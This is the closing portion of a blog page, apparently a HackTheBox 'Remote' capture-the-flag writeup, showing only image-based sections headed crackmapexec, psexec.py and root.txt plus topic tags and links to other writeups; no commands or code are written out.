+</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/b2e9742854dd8530f2dc3634f4e88661.png" alt="b2e9742854dd8530f2dc3634f4e88661.png" /></p><h2 id="crackmapexec">crackmapexec</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/92ca6f47e3c8eea4a03156945dafd0bd.png" alt="92ca6f47e3c8eea4a03156945dafd0bd.png" /></p><h2 id="psexecpy">psexec.py</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/92a7e5654b6ae37f60efda036ab2baa7.png" alt="92a7e5654b6ae37f60efda036ab2baa7.png" /></p><h3 id="roottxt">root.txt</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/905591045f8bec5eb1d47b27c5fb9ee2.png" alt="905591045f8bec5eb1d47b27c5fb9ee2.png" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/windows-machines/'>Windows Machines</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/nfs/" class="post-tag no-text-decoration" >NFS</a> <a href="/tags/umbraco/" class="post-tag no-text-decoration" >umbraco</a> <a href="/tags/teamviewer/" class="post-tag no-text-decoration" >TeamViewer</a> <a href="/tags/crackmapexec/" class="post-tag no-text-decoration" >crackmapexec</a> <a href="/tags/nishang/" class="post-tag no-text-decoration" >Nishang</a> <a href="/tags/decrypt/" class="post-tag no-text-decoration" >decrypt</a> <a href="/tags/conptyshell/" class="post-tag no-text-decoration" >conptyshell</a> <a href="/tags/cred-reutilization/" class="post-tag no-text-decoration" >cred reutilization</a> <a href="/tags/exploitdb/" class="post-tag no-text-decoration" >exploitdb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox — Remote Writeup - b3t4m3&url=http://localhost:4000/posts/RemoteHTB/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox — Remote Writeup - b3t4m3&u=http://localhost:4000/posts/RemoteHTB/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="" data-toggle="tooltip" data-placement="top" title="" target="_blank"> <i class="fa-fw "></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/PassageHTB/">HackTheBox — Passage Writeup</a></li><li><a href="/posts/Doctor-HTB/">HackTheBox — Doctor Writeup</a></li><li><a href="/posts/Omni-HTB/">HackTheBox — Omni Writeup</a></li><li><a href="/posts/Fuse-HTB/">HackTheBox — Fuse Writeup</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ffuf/">ffuf</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/masscan/">masscan</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Fuse-HTB/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Nov 3, 2020 <i class="unloaded">2020-11-03T07:50:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox — Fuse Writeup</h3><div class="text-muted small"><p> Fuse is based on Printers in corporate environment making it quite realistic machine, We’ll complete it using both Intended and Unintended method. We start off with web enumeration of a printer ...</p></div></div></a></div><div class="card"> <a href="/posts/Blackfield-HTB/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Oct 8, 2020 <i class="unloaded">2020-10-08T06:50:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox — Blackfield Writeup</h3><div class="text-muted small"><p> Blackfield was a exceptional Windows box centralized on Active Directory environment, initial SMB enumeration reveals potential usernames of Domain accounts. We validate them using kerbrute - a ...</p></div></div></a></div><div class="card"> <a href="/posts/Buff-HTB/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Nov 24, 2020 <i class="unloaded">2020-11-24T06:40:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox — Buff Writeup</h3><div class="text-muted small"><p> Buff is a quite easy box highlighting basics of enumeration, where we discover a website running a vulnerable software and exploit it using a publicly available exploit to a get remote code exec...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/LegacyHTB/" class="btn btn-outline-primary"><p>HackTheBox — Legacy Writeup</p></a> <a href="/posts/LameHTB/" class="btn btn-outline-primary"><p>HackTheBox — Lame Writeup</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT License --><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//b3t4m3.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/RemoteHTB/'; this.page.identifier = '/posts/RemoteHTB/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="ColdFusionX" data-description="Your Support means the World to me !" data-message="Thank you for visiting. Hope you liked my Blog!" data-color="#5F7FFF" data-position="" data-x_margin="18" data-y_margin="18"></script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://github.com/bet4m3">Carlos Sequeira</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span> <script src="https://www.hackthebox.eu/badge/163155"></script></p></div><div class="footer-right"><p class="mb-0"><h4>Realm of Knowledge</h4></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ffuf/">ffuf</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/masscan/">masscan</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
